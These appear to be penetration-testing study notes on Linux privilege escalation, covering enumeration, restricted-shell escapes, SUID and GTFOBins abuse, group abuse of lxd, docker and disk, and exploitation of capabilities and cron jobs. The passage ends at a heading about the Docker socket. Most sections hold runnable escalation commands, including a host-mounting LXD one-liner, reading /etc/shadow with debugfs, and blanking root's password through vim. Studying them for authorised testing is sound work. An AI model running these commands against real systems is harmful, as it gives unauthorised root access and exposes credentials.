# Linux Privilege Escalation

## Linux Services & Internals Enumeration

* **Network & Host Reconnaissance:** Discover active interfaces using `ip a` and local host mappings via `cat /etc/hosts` to uncover secondary internal subnets, pivot opportunities, or internal domain names.
* **User & Session Activity:** Audit historical logins with `lastlog`, active terminal sessions via `w`, current shell history with `history`, and hidden shell history logs using `find` to reveal operational habits or credentials passed in command arguments.
* **Scheduled Tasks & Process Memory:** Inspect system cron folders (`ls -la /etc/cron.daily/`) to find writable scripts executed by root, and query live process execution parameters directly from virtual memory via `/proc` (`find /proc -name cmdline ...`) to catch cleartext credentials.
* **Package Auditing & GTFObins Automation:** Extract clean lists of installed software, check the local `sudo` version (`sudo -V`) for historical vulnerabilities (e.g., Baron Samedit), and cross-reference installed package binaries against the GTFObins API to find built-in shell escape vectors.
* **System Call Analysis (`strace`):** Intercept low-level kernel interactions (`strace ping ...`) to identify missing dynamic library paths (`.so`), insecure temporary file creation, or file checks that can be hijacked.
* **Custom Scripts, Configurations & Services:** Search for system-wide configuration files (`.conf`), custom administrative scripts (`.sh`), and root-owned background processes (`ps aux | grep root`) to locate hardcoded API keys, database passwords, or unprivileged execution paths.

#### Command Master Breakdown

| **Category**           | **Command**                                                                                                                                                                                               | **Component Syntax Breakdown**                                                                                                                                                                                                                                                                                                                                                | **Privilege Escalation / Security Utility**                                                                 |
| ---------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------- |
| **Networking**         | `ip a`                                                                                                                                                                                                    | <p><code>ip</code>: Network routing/device utility.<br><br><br><br><code>a</code>: Abbreviation for <code>address</code> (shows all interface IP details).</p>                                                                                                                                                                                                                | Reveals secondary network interfaces and dual-homed configurations for pivoting.                            |
| **Host Mapping**       | `cat /etc/hosts`                                                                                                                                                                                          | <p><code>cat</code>: Concatenate and print file contents.<br><br><br><br><code>/etc/hosts</code>: Static IP-to-hostname translation file.</p>                                                                                                                                                                                                                                 | Discovers internal domain names, internal web virtual hosts, and domain controllers.                        |
| **User Activity**      | `lastlog`                                                                                                                                                                                                 | `lastlog`: Queries `/var/log/lastlog` to format recent user login times across all accounts.                                                                                                                                                                                                                                                                                  | Identifies active human user accounts versus dormant or system-only accounts.                               |
| **Active Sessions**    | `w`                                                                                                                                                                                                       | `w`: Displays currently logged-in users, idle time, and their active foreground commands.                                                                                                                                                                                                                                                                                     | Detects concurrent administrative sessions and active terminal operations.                                  |
| **Command History**    | `history`                                                                                                                                                                                                 | `history`: Prints the in-memory command history buffer of the current shell session.                                                                                                                                                                                                                                                                                          | Extracts accidentally entered credentials, internal SSH keys, or administrative commands.                   |
| **History Discovery**  | `find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null`                                                                                                                      | <p><code>find /</code>: Search root.<br><br><br><br><code>-type f</code>: Files only.<br><br><br><br><code>\( ... \)</code>: Group matching <code>*_hist</code> OR (<code>-o</code>) <code>*_history</code>.<br><br><br><br><code>-exec ls -l {} \;</code>: Run detailed list.<br><br><br><br><code>2>/dev/null</code>: Silence permission errors.</p>                        | Locates unlinked, backup, or application-specific command history files containing secrets.                 |
| **Cron Auditing**      | `ls -la /etc/cron.daily/`                                                                                                                                                                                 | <p><code>ls -la</code>: List all directory contents including hidden files in long format.<br><br><br><br><code>/etc/cron.daily/</code>: System directory for daily cron tasks.</p>                                                                                                                                                                                           | Checks permissions on scheduled tasks to find scripts that can be modified to execute code as `root`.       |
| **Proc Inspection**    | `find /proc -name cmdline -exec cat {} \; 2>/dev/null \\| tr " " "\n"`                                                                                                                                    | <p><code>find /proc -name cmdline</code>: Finds process argument files in kernel memory.<br><br><br><br><code>cat</code>: Reads raw bytes.<br><br><br><br><code>tr " " "\n"</code>: Replaces spaces/null bytes with newlines.</p>                                                                                                                                             | Extracts full command-line arguments and inline passwords from currently running background processes.      |
| **Package Auditing**   | `apt list --installed \\| tr "/" " " \\| cut -d" " -f1,3 \\| sed 's/[0-9]://g' \\| tee -a installed_pkgs.list`                                                                                            | <p><code>apt list --installed</code>: Lists installed packages.<br><br><br><br><code>tr "/" " "</code>: Replaces <code>/</code> with space.<br><br><br><br><code>cut -d" " -f1,3</code>: Keeps name &#x26; version.<br><br><br><br><code>sed 's/[0-9]://g'</code>: Removes epoch prefix.<br><br><br><br><code>tee -a</code>: Writes output to screen and appends to file.</p> | Generates a clean software inventory list to cross-reference against SearchSploit or CVE databases.         |
| **Sudo Auditing**      | `sudo -V`                                                                                                                                                                                                 | <p><code>sudo</code>: Superuser execution utility.<br><br><br><br><code>-V</code>: Version details and build configurations.</p>                                                                                                                                                                                                                                              | Identifies legacy `sudo` binaries vulnerable to known exploits (e.g., CVE-2021-3156 / Baron Samedit).       |
| **Binary Enumeration** | `ls -l /bin /usr/bin/ /usr/sbin/`                                                                                                                                                                         | <p><code>ls -l</code>: Long listing.<br><br><br><br><code>/bin /usr/bin/ /usr/sbin/</code>: Standard directories containing system executables.</p>                                                                                                                                                                                                                           | Audits available system utilities, custom binaries, and standard administrative tools.                      |
| **GTFObins Lookup**    | `for i in $(curl -s [https://gtfobins.org/api.json](https://gtfobins.org/api.json) \\| jq -r '.executables \\| keys[]'); do if grep -q "$i" installed_pkgs.list; then echo "Check for GTFO: $i";fi; done` | <p><code>curl -s</code>: Fetches GTFObins JSON quietly.<br><br><br><br><code>jq -r</code>: Extracts executable names.<br><br><br><br><code>for i in ...</code>: Loops through binaries.<br><br><br><br><code>grep -q</code>: Checks if binary exists in package list.</p>                                                                                                     | Automates the detection of installed binaries that can be leveraged for shell escapes or SUID exploits.     |
| **System Call Trace**  | `strace ping -c1 10.129.112.20`                                                                                                                                                                           | <p><code>strace</code>: Traces kernel system calls.<br><br><br><br><code>ping -c1</code>: Sends 1 ICMP packet to target IP.</p>                                                                                                                                                                                                                                               | Pinpoints missing dynamic `.so` libraries, file access failures, or insecure execution steps in binaries.   |
| **Config Searching**   | `find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null`                                                                                                                       | <p><code>find /</code>: Search root.<br><br><br><br><code>-type f</code>: Files only.<br><br><br><br><code>-name *.conf -o -name *.config</code>: Matches configuration files.<br><br><br><br><code>-exec ls -l</code>: Shows file metadata.</p>                                                                                                                              | Discovers world-readable configuration files containing database passwords, API tokens, or key paths.       |
| **Script Searching**   | `find / -type f -name "*.sh" 2>/dev/null \\| grep -v "src\\|snap\\|share"`                                                                                                                                | <p><code>find</code>: Locates all <code>.sh</code> shell scripts.<br><br><br><br><code>grep -v "src\|snap\|share"</code>: Excludes non-relevant standard system paths.</p>                                                                                                                                                                                                    | Isolates custom administrative scripts that may suffer from loose write permissions or insecure code logic. |
| **Process Inspection** | `ps aux \\| grep root`                                                                                                                                                                                    | <p><code>ps aux</code>: Displays all running processes across all users.<br><br><br><br><code>grep root</code>: Filters results to processes running under <code>root</code> privileges.</p>                                                                                                                                                                                  | Identifies privileged background daemons and custom applications for targeted exploitation.                 |

***

***

## Escaping Restricted Shells

## 🔒 Restricted Shell Types

Shell

Description

**rbash**

Restricted Bourne shell - limits cd, PATH modification

**rksh**

Restricted Korn shell - blocks shell functions, command execution

**rzsh**

Restricted Z shell - prevents aliases, script execution

### 🚪 Escape Techniques

#### SSH Bypass Methods

```
# Method 1: SSH with bash noprofile
ssh user@target -t "bash --noprofile"

# Method 2: SSH with different shell
ssh user@target -t "/bin/bash"
ssh user@target -t "/bin/sh"

# Method 3: SSH command execution
ssh user@target "bash -i"

# Method 4: SSH with environment bypass
ssh user@target -t "env -i bash --norc --noprofile"
```

#### Command Injection

```
# Via backticks (command substitution)
ls -l `pwd`
ls -l `bash`

# Via $() substitution
ls -l $(bash)
ls -l $(sh)

# Via environment variables
echo $0
$0  # Often launches unrestricted shell
```

#### Environment Variable Manipulation

```
# Check available variables
env

# Exploit SHELL variable
SHELL=/bin/bash
$SHELL

# PATH manipulation (if allowed)
PATH=/bin:/usr/bin
export PATH
bash
```

#### Built-in Command Abuse

```
# Vi/Vim escape
vi
:!/bin/bash

# Less/More pager escape
less /etc/passwd
!/bin/bash

# Man page escape
man ls
!/bin/bash

# Python escape (if available)
python -c "import os; os.system('/bin/bash')"

# perl escape (if available)
perl -e 'exec "/bin/bash";'

# awk escape (if available)
awk 'BEGIN {system("/bin/bash")}'
```

#### Shell Function Exploitation

```
# Define function to execute bash
function() { /bin/bash; }
function

# Or use eval
eval "bash"
```

### 🔧 Advanced Bypass Techniques

#### Character Escaping

```
# Use backslashes
\b\a\s\h

# Use quotes
"bash"
'bash'

# Use variable expansion
b=bash
$b
```

#### Alternative Interpreters

```
# Try different shells
sh
dash
zsh
csh
tcsh

# Scripting languages
python -c "import pty; pty.spawn('/bin/bash')"
perl -e 'exec "/bin/bash";'
ruby -e 'exec "/bin/bash"'
```

#### File-based Escapes

```
# Create script file
echo "/bin/bash" > escape.sh
chmod +x escape.sh
./escape.sh

# Use existing binaries
cp /bin/bash /tmp/mybash
/tmp/mybash
```

### 🔍 Enumeration & Detection

#### Identify Restricted Shell

```
# Check current shell
echo $SHELL
echo $0

# Test restrictions
cd /tmp    # Will fail in rbash
export TEST=value  # Will fail if export restricted
bash       # Will fail if command execution blocked
```

#### Quick Escape Test Script

```
#!/bin/bash
echo "=== RESTRICTED SHELL ESCAPE TEST ==="

echo "[+] Current shell: $SHELL"
echo "[+] Shell type: $0"

echo "[+] Testing SSH bypass methods:"
echo "ssh user@host -t 'bash --noprofile'"
echo "ssh user@host -t '/bin/bash'"

echo "[+] Testing command substitution:"
echo 'ls -l `pwd`'
echo 'ls -l $(bash)'

echo "[+] Testing environment variables:"
echo '$SHELL'
echo '$0'

echo "[+] Testing alternative interpreters:"
which python python3 perl ruby 2>/dev/null
```

***

***

## Special Permissions

**1. SUID (Set User ID) Mechanics**

When the SUID bit (`4000`) is set on an executable file, any user who runs that binary executes it with the privileges of the file's owner (typically `root`). In file permission strings, this is represented by an `s` in the owner's execute position (`-rwsr-xr-x`).

**2. Key Findings in the SUID Output**

The command `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null` lists all SUID binaries owned by `root`. The output contains three categories of files:

* **Standard OS Binaries (Normal):** `/bin/su`, `/bin/mount`, `/usr/bin/passwd`, `/usr/bin/sudo`, `/usr/bin/pkexec`
  * These require root privileges to function properly during normal system operations.
* **Suspicious Custom Binaries (High Interest):** `/home/htb-student/shared_obj_hijack/payroll` `/home/mrb3n/payroll`
  * Custom binaries placed in home directories with SUID set are common targets for reverse engineering, buffer overflows, or shared library hijacking.
* **Vulnerable Binary Version (High Interest):** `/usr/bin/screen-4.5.0`
  * Standard system binaries usually don't append version numbers in `/usr/bin/`. GNU `screen` version 4.5.0 contains a well-known local privilege escalation vulnerability (CVE-2017-5618).
* **The Capital "S" Anomaly:** `-rwSr--r-- 1 root root ... /home/cliff.moore/netracer`
  * A capital **`S`** means the SUID bit is set, but the owner **does not** have execute (`x`) permission (`rwS` instead of `rws`).

**3. SGID (Set Group ID) Mechanics**

The SGID bit (`2000`) executes a binary with the privileges of the file's assigned group. The search command `find / -user root -perm -6000 ...` looks for files that have **either or both** SUID (`4000`) and SGID (`2000`) bits set ($$4000 + 2000 = 6000$$).

* **Output Match:** `/usr/lib/snapd/snap-confine` (`-rwsr-sr-x`) has both SUID (`s` in owner) and SGID (`s` in group) bits enabled.

**4. GTFOBins & Abuse Logic**

[GTFOBins](https://gtfobins.github.io/) documents how standard UNIX binaries can be repurposed to bypass security controls or spawn elevated shells when misconfigured with `sudo` or `SUID` permissions.

*   **Module Example Breakdown:** Bash

    ```
    sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
    ```

    This leverages `apt-get`'s configuration flag `-o` to define a shell command (`/bin/sh`) to run before updating. Because `apt-get` is executed via `sudo`, the spawned shell inherits `root` privileges (`uid=0`).

| **Permission Bit**     | **Octal Value** | **Symbolic Notation**     | **File Behavior**                   | **Directory Behavior**                                 |
| ---------------------- | --------------- | ------------------------- | ----------------------------------- | ------------------------------------------------------ |
| **SUID** (Set User ID) | `4000`          | `s` (Owner: `rws------`)  | Executes with file owner privileges | No standard effect on Linux                            |
| **SGID / SetGID**      | `2000`          | `s` (Group: `rwxr-s---`)  | Executes with group privileges      | New files inside inherit directory group ownership     |
| **Sticky Bit**         | `1000`          | `t` (Others: `rwxrwxrwt`) | No effect on regular files          | Only file owner or root can delete/rename files inside |

**Standard Permission Values**

| **Permission** | **Octal Value** | **Symbolic Representation** | **Binary Equivalent** | **File Access**   | **Directory Access**        |
| -------------- | --------------- | --------------------------- | --------------------- | ----------------- | --------------------------- |
| **Read**       | `4`             | `r`                         | `100`                 | Read contents     | List directory entries      |
| **Write**      | `2`             | `w`                         | `010`                 | Modify contents   | Add/delete files inside     |
| **Execute**    | `1`             | `x`                         | `001`                 | Run as executable | Enter (`cd`) into directory |

**`find -perm` Search Modifiers**

| **Syntax Variant**   | **Operator**      | **Matching Logic**                              | **Search Result Behavior**                   |
| -------------------- | ----------------- | ----------------------------------------------- | -------------------------------------------- |
| `find . -perm 2000`  | Exact Mode        | Matches files with **exact** permissions `2000` | Only matches files with mode `---s------`    |
| `find . -perm -2000` | Bitwise AND (`-`) | Matches if **all** specified bits are set       | Matches `2755` (`rwxr-sr-x`), `2775`, etc.   |
| `find . -perm /2000` | Bitwise OR (`/`)  | Matches if **any** specified bits are set       | Matches any file having the SGID bit enabled |

***

***

## Privileged Groups

In Linux, group memberships define access rights to system resources, daemons, and raw devices. When misconfigured or granted to unprivileged accounts, certain system groups introduce direct paths to full system control due to how host daemons manage process boundaries and file permissions.

**LXD / LXC Group**

* **Daemon Privileges:** LXD runs as a system daemon with full root privileges to create, configure, and isolate container instances on Linux hosts.
* **UID Mapping Bypass:** Standard containers map container UID `0` to an unprivileged UID on the host. However, when a container is initialized as "privileged" (`security.privileged=true`), UID mapping is disabled, causing UID `0` inside the container to map directly to UID `0` (root) on the host system.
* **Host Mount Exposure:** Members of the `lxd` group interact with the daemon via its Unix socket. By launching a privileged container and mounting the host's root filesystem (`source=/`) into the container filesystem, an unprivileged host user gains unrestricted read and write access to all host files via container execution.

**Docker Group**

* **Socket Access:** Direct access to the Docker control socket (`/var/run/docker.sock`) is functionally equivalent to host root access because the Docker daemon (`dockerd`) executes with host root privileges.
* **Volume Mounting:** Members of the `docker` group can spawn container instances and use volume flags (`-v /:/mnt`) to attach the underlying host's root storage. Because files mounted from the host retain host-level ownership and permissions, container applications running as root can freely modify host configuration files, SSH keys, or administrative accounts.

**Disk Group**

* **Raw Device Access:** Block storage devices in `/dev` (such as `/dev/sda` or `/dev/nvme0n1`) are typically owned by `root:disk` with read/write permissions for group members.
* **Bypassing Kernel VFS Controls:** Access to raw device blocks allows users to bypass standard kernel Virtual File System (VFS) permission checks. Using file system debugging tools (e.g., `debugfs`) or raw data readers, members of the `disk` group can inspect block structures, recover unmapped data, or read protected files directly from disk sectors.

**ADM Group**

* **System Monitoring Scope:** The `adm` (administration) group grants read permissions to system monitoring data and log archives within `/var/log`.
* **Information Disclosure:** Although `adm` membership does not grant code execution or file write capabilities, system logs frequently capture operational details, including service errors, historical authentication attempts (`auth.log`), execution flags, residual credentials, and cron task outputs.

### 🎯 Overview

Certain Linux groups provide elevated privileges that can be exploited for privilege escalation through container access, disk manipulation, or administrative file access.

### 🐳 High-Risk Groups

#### LXD Group

**Impact**: Container root = host root

```bash
# Check membership
id | grep lxd

# Create privileged container
lxd init  # Use defaults
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
lxc start r00t
lxc exec r00t /bin/sh

# Access host filesystem as root
cd /mnt/root/root
```

#### Docker Group

**Impact**: Host filesystem access via containers

```bash
# Check membership
id | grep docker

# Mount host filesystem
docker run -v /:/mnt -it ubuntu
cd /mnt/root  # Host root directory
```

#### Disk Group

**Impact**: Raw device access

```bash
# Check membership
id | grep disk

# Access filesystem directly
debugfs /dev/sda1
# In debugfs: cat /etc/shadow
```

#### ADM Group

**Impact**: Log file access

```bash
# Check membership
id | grep adm

# Read all system logs
find /var/log -readable 2>/dev/null
grep -r "password\|secret" /var/log/ 2>/dev/null
```

### 🚀 Quick Exploitation

#### LXD Privilege Escalation

```bash
# One-liner container escalation (if alpine image exists)
lxc init alpine pwn -c security.privileged=true && lxc config device add pwn host disk source=/ path=/mnt/root recursive=true && lxc start pwn && lxc exec pwn /bin/sh
```

#### Docker Escalation

```bash
# Mount host root
docker run -v /:/hostfs -it ubuntu bash
chroot /hostfs
```

#### Other Dangerous Groups

```bash
# Video group - framebuffer access
id | grep video

# Audio group - audio device access  
id | grep audio

# Shadow group - /etc/shadow access
id | grep shadow

# Staff group - /usr/local write access
id | grep staff
```

### 🔍 Group Enumeration

#### Check All User Groups

```bash
# Current user groups
id
groups

# All groups on system
cat /etc/group

# Group membership details
getent group lxd
getent group docker
getent group disk
getent group adm
```

#### Privileged Group Detection Script

```bash
#!/bin/bash
echo "=== PRIVILEGED GROUPS CHECK ==="

dangerous_groups="lxd docker disk adm shadow staff video audio"

echo "[+] Current user groups:"
id

for group in $dangerous_groups; do
    if id | grep -q $group; then
        echo "[!] PRIVILEGED GROUP: $group"
        case $group in
            lxd) echo "    -> Container root access" ;;
            docker) echo "    -> Host filesystem access" ;;
            disk) echo "    -> Raw device access" ;;
            adm) echo "    -> Log file access" ;;
            shadow) echo "    -> Password hash access" ;;
        esac
    fi
done
```

### 🔑 Quick Reference

#### Immediate Checks

```bash
# Check for dangerous group membership
id | grep -E "(lxd|docker|disk|adm|shadow)"

# LXD quick escalation
lxc image list  # Check for existing images
lxc list       # Check existing containers

# Docker quick escalation  
docker images  # Check available images
docker ps -a   # Check containers
```

#### Emergency Escalation

```bash
# If in lxd group
lxc exec container_name /bin/sh

# If in docker group
docker run -v /:/mnt -it ubuntu

# If in disk group
debugfs /dev/sda1

# If in adm group
find /var/log -readable | head -10
```

***

_Privileged group membership often provides immediate privilege escalation paths - container access, disk manipulation, and administrative file access can lead directly to root privileges._

***

***

## Capabilities

Linux capabilities divide traditional root privileges into distinct, fine-grained permissions attached directly to executable files using extended file attributes.

Rather than granting an executable full administrative control through standard SetUID mechanics, capabilities allow system administrators to assign only the specific privileges a program needs to function—such as binding to low-numbered network ports or modifying system resource limits.

Security vulnerabilities arise when high-privilege capabilities are assigned to binaries that allow user interaction or file manipulation. For example, assigning permissions that bypass file read and write checks (`CAP_DAC_OVERRIDE`) or alter process user IDs (`CAP_SETUID`) to an interactive tool enables non-administrative users to modify critical system configurations or inherit elevated execution rights.

| **Capability**         | **Description**                                                                                                                                           |
| ---------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `cap_sys_admin`        | Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.                                     |
| `cap_sys_chroot`       | Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.            |
| `cap_sys_ptrace`       | Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes. |
| `cap_sys_nice`         | Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.               |
| `cap_sys_time`         | Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.                |
| `cap_sys_resource`     | Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.       |
| `cap_sys_module`       | Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.      |
| `cap_net_bind_service` | Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.                         |

| **Capability Values** | **Description**                                                                                                                                                                                                                                                                                                                                                                                                               |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `=`                   | This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.                                                                                                                                                                                                                                        |
| `+ep`                 | This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.                                                                                                                                                    |
| `+ei`                 | This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.                                                                                                                                    |
| `+p`                  | This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it. |

| **Capability**     | **Description**                                                                                                                                                                                                              |
| ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `cap_setuid`       | Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the `root` user.                                                                                          |
| `cap_setgid`       | Allows to set its effective group ID, which can be used to gain the privileges of another group, including the `root` group.                                                                                                 |
| `cap_sys_admin`    | This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the `root` user, such as modifying system settings and mounting and unmounting file systems. |
| `cap_dac_override` | Allows bypassing of file read, write, and execute permission checks.                                                                                                                                                         |

**Enumeration**

* `getcap -r / 2>/dev/null`
  * Searches the entire file system recursively to list all files with capabilities assigned to them, suppressing permission errors.
* `getcap /usr/bin/vim.basic`
  * Queries and displays the specific capabilities attached to a single target binary.

**Setting Capabilities**

* `sudo setcap cap_dac_override=+ep /usr/bin/vim.basic`
  * Grants an executable the capability to bypass file read, write, and execute permission checks with effective and permitted flags.
* `sudo setcap cap_setuid=+ep /usr/bin/python3`
  * Grants an executable the capability to change its effective user ID to any user, including root.

**Removing Capabilities**

* `sudo setcap -r /usr/bin/vim.basic`
  * Clears and removes all capability attributes from the target binary.

**Exploitation**

* `echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd`
  * Leverages a `cap_dac_override` capability on Vim to remove the password requirement for the root account in `/etc/passwd`.
* `/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
  * Leverages a `cap_setuid` capability on Python to switch the process User ID to root (`0`) and spawn an elevated shell.

***

***

## Cron Job Abuse

Cron is a Linux daemon responsible for running scheduled background tasks (cron jobs). When a task is configured to execute under the `root` account, all commands within that script run with full administrative rights. If the underlying script or cron file is marked as world-writable (`-rwxrwxrwx` or `o+w`), any standard user on the system can modify the script's code. The next time the cron daemon executes the script on its configured schedule, it runs the modified code as `root`.

**Commands Breakdown**

*   **Finding World-Writable Files:** Bash

    ```
    find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
    ```

    Searches the entire filesystem (`/`) for regular files (`-type f`) where non-owner users have write permission (`-perm -o+w`). It skips the virtual `/proc` directory (`-path /proc -prune`) to prevent hanging processes and redirects error messages to null (`2>/dev/null`).
*   **Checking Directory Permissions & Timestamps:** Bash

    ```
    ls -la /dmz-backups/
    ```

    Lists all contents of the directory with full detail (`-l`), including hidden files (`-a`). Observing timestamps on generated files (e.g., backup archives created every 3 minutes) reveals how frequently the cron job executes.
*   **Monitoring System Processes:** Bash

    ```
    ./pspy64 -pf -i 1000
    ```

    Launches the `pspy64` executable to print process and file system events (`-pf`) while setting the scan interval to every 1000 milliseconds (`-i 1000`).
*   **Starting a Netcat Listener:** Bash

    ```
    nc -lnvp 443
    ```

    Configures Netcat to listen (`-l`) for incoming connections on port 443 (`-p 443`) in verbose mode (`-v`) without resolving hostnames (`-n`).

**Tools Used**

* **`pspy`** An unprivileged Linux process monitoring tool. Standard utilities like `ps` or `top` often miss short-lived processes executed by background tasks. `pspy` tracks process creation in real time without requiring `root` access by constantly scanning the `/proc` filesystem and leveraging `inotify` system events.

***

***

## Containers

#### Command Breakdown

**1. `id`**

Bash

```
container-user@nix02:~$ id
```

* **Purpose:** Displays the current user's numerical User ID (`uid`), Group ID (`gid`), and secondary group memberships.
* **Key Detail:** The output reveals membership in `116(lxd)`. The LXD management daemon runs with root privileges on the host system. Any user in the `lxd` group can issue commands directly to this daemon via its local UNIX socket, granting administrative control over container creation and device configuration.

**2. `cd ContainerImages` & `ls`**

Bash

```
container-user@nix02:~$ cd ContainerImages
container-user@nix02:~$ ls
```

* **Purpose:** Navigates into the working directory and lists its contents to confirm the presence of a local LXC image archive (`ubuntu-template.tar.xz`).

**3. `lxc image import ubuntu-template.tar.xz --alias ubuntutemp`**

Bash

```
container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
```

* **`lxc image import`:** Imports a local rootfs archive file into LXD's image store so it can be used to build containers.
* **`ubuntu-template.tar.xz`:** Specifies the compressed tarball containing the base Linux file structure.
* **`--alias ubuntutemp`:** Assigns the short label `ubuntutemp` to the imported image for easier referencing in later commands.

**4. `lxc image list`**

Bash

```
container-user@nix02:~$ lxc image list
```

* **Purpose:** Displays a tabular summary of all locally stored LXD images, confirming that `ubuntutemp` was successfully imported alongside its fingerprint, architecture, and size.

**5. `lxc init ubuntutemp privesc -c security.privileged=true`**

Bash

```
container-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=true
```

* **`lxc init`:** Creates and configures a new container instance without starting it immediately.
* **`ubuntutemp`:** Specifies the source base image template to use.
* **`privesc`:** Names the newly generated container instance.
* **`-c security.privileged=true`:** Configures a security flag that disables user namespace isolation. In standard (unprivileged) containers, root inside the container (`UID 0`) is mapped to an unprivileged high UID on the host. Setting `security.privileged=true` causes root inside the container to map directly to real root (`UID 0`) on the host machine.

**6. `lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true`**

Bash

```
container-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

* **`lxc config device add`:** Attaches a hardware or virtual device to the container configuration.
* **`privesc`:** The target container receiving the device configuration.
* **`host-root`:** A custom name given to this device entry.
* **`disk`:** Identifies the device type as a mountable directory/filesystem.
* **`source=/`:** Defines the path on the **host machine** to mount (in this case, the host's root directory `/`).
* **`path=/mnt/root`:** Defines the destination directory **inside the container** where the host directory will be mounted.
* **`recursive=true`**: Ensures all host submounts (such as `/var`, `/home`, `/proc`) are included within `/mnt/root`.

**7. `lxc start privesc`**

Bash

```
container-user@nix02:~$ lxc start privesc
```

* **Purpose:** Powers on and boots the `privesc` container with the specified configuration settings and mounted host disk device.

**8. `lxc exec privesc /bin/bash`**

Bash

```
container-user@nix02:~$ lxc exec privesc /bin/bash
```

* **Purpose:** Spawns an interactive interactive `/bin/bash` shell inside the running `privesc` container. Because the container was started as privileged, this shell runs as `root` (`UID 0`).

**9. `ls -l /mnt/root`**

Bash

```
root@nix02:~# ls -l /mnt/root
```

* **Purpose:** Lists the contents of `/mnt/root` inside the container. Since the host filesystem `/` was mounted to this location, the user inside the container now has direct access to inspect or modify all host directories (such as `/mnt/root/etc/shadow` or `/mnt/root/root/`).

#### Key Takeaway & Remediation

* **Root Equivalent:** Membership in the `lxd` or `lxc` group is functionally equivalent to having unconstrained `sudo` or `root` access on the host.
* **Mitigation:** Only grant `lxd` group membership to fully trusted administrative accounts. Additionally, enable LXD daemon authentication restriction or enforce RBAC (Role-Based Access Control) using OpenFGA/LXD fine-grained controls to prevent unauthorized creation of privileged containers or arbitrary host disk mounts.

***

***

## Docker

### 1. Docker Architecture & Core Concepts

Docker uses a **client-server architecture** designed to isolate applications inside lightweight units called **containers**.

```
 +------------------+              UNIX Socket / REST API              +-------------------+
 |  Docker Client   |  -------------------------------------------->   |   Docker Daemon   |
 |  (docker CLI)    |                                                  |    (dockerd)      |
 +------------------+                                                  +-------------------+
                                                                                 |
                                                                       +-------------------+
                                                                       | Containers / Nets |
                                                                       +-------------------+
```

#### Core Components

* **Docker Daemon (`dockerd`)**: The background process running on the host OS with **root privileges**. It manages images, containers, networks, and persistent storage volumes.
* **Docker Client (`docker` CLI)**: The command-line utility used to issue commands. It communicates with the daemon via REST API calls over a UNIX domain socket (`/var/run/docker.sock`) or a network port.
* **Docker Images vs. Containers**:
  * **Image**: A read-only, immutable template containing application code, binaries, libraries, and settings.
  * **Container**: A running, mutable instance of an image using Linux namespaces (PID, MNT, NET) for isolation and control groups (`cgroups`) for resource limits.
* **Docker Socket (`docker.sock`)**: The IPC (Inter-Process Communication) endpoint where `dockerd` listens for API commands. Because `dockerd` runs as `root`, control over this socket gives full access to the underlying system.

### 2. Docker Privilege Escalation Mechanics

In Linux, membership in the `docker` group or write access to the Docker socket is **functionally equivalent to host root access**.

#### Why Privilege Escalation Occurs

1. **Root-Level Execution**: The Docker daemon executes all host operations (creating files, mounting drives, configuring networks) as `root`.
2. **Mounting Host System Directories**: If a user can instruct the daemon to create a container, they can tell it to mount any host directory—including the host root directory (`/`)—into the container.
3. **Container Root vs. Host Root**: By default, root inside an unprivileged container maps directly to UID `0` (root) on the host system unless User Namespaces (`userns-remap`) are explicitly enabled.

### 3. Command Breakdown & Technical Explanation

#### Scenario A: Extracting Host Files via Bind Mounts

When an existing container has host directories mapped into it via volume bind mounts:

Bash

```
cd /hostsystem/home/cry0l1t3
ls -l
cat .ssh/id_rsa
```

* **Theory**: The administrator mounted `/home/cry0l1t3` from the host system into `/hostsystem/home/cry0l1t3` inside the container.
* **Impact**: If the container process runs as root (UID 0), it bypasses host file permission checks on the mounted folder, allowing read access to private files such as SSH keys (`id_rsa`).

Bash

```
ssh cry0l1t3@<host IP> -i cry0l1t3.priv
```

* **Theory**: Uses the extracted private key (`cry0l1t3.priv`) to establish an SSH session directly on the host as user `cry0l1t3`.

#### Scenario B: Exploiting an Exposed Docker Socket (`docker.sock`)

